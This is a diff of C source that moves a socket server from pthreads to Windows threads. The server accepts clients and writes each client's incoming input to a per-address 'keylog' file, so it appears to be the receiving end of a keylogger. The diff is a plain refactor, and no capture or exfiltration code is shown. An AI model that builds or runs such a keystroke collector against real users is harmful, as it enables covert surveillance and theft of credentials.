@@ -3,11 +3,10 @@
 #include "log.h"
 #include "net_util.h"
 
+#include <minwindef.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <synchapi.h>
-
-#include <pthread.h>
 
 #define KEYLOG_PREFIX_LEN 7
 
@@ -19,10 +18,10 @@ static void create_keylog(FILE **f, char *name) {
   fopen_s(f, modded_name, "a");
 }
 
-void *accept_clients(void *vargp) {
+DWORD WINAPI accept_clients(LPVOID lpParameter) {
   LOG_DEBUG("accepting a connection");
-  Server *server = (Server *)vargp;
-  pthread_t client_handler_threads[MAX_CLIENTS];
+  Server *server = (Server *)lpParameter;
+  HANDLE client_handler_threads[MAX_CLIENTS];
   int conn_count = 0;
   int client_index = 0;
   SocketAddress saddr;
@@ -51,17 +50,15 @@ void *accept_clients(void *vargp) {
     InetNtop(AF_INET, (void *)&saddr, server->clients[client_index].addr,
              ADDR_LEN);
     ++conn_count;
-    pthread_create(client_handler_threads + client_index, NULL,
-                   client_input_handler,
-                   (void *)(server->clients + client_index));
+    client_handler_threads[client_index] = create_thread(client_input_handler, server->clients + client_index);
     ++client_index;
   }
-  return NULL;
+  return 0;
 }
 
-void *client_input_handler(void *vargp) {
+DWORD WINAPI client_input_handler(LPVOID lpParameter) {
   LOG_DEBUG();
-  Client *client_info = (Client *)vargp;
+  Client *client_info = (Client *)lpParameter;
   SOCKET client = client_info->conn;
   FILE *keylog;
   create_keylog(&keylog, client_info->addr);
@@ -120,5 +117,5 @@ void *client_input_handler(void *vargp) {
   }
 exit:
   fclose(keylog);
-  return NULL;
+  return 0;
 }
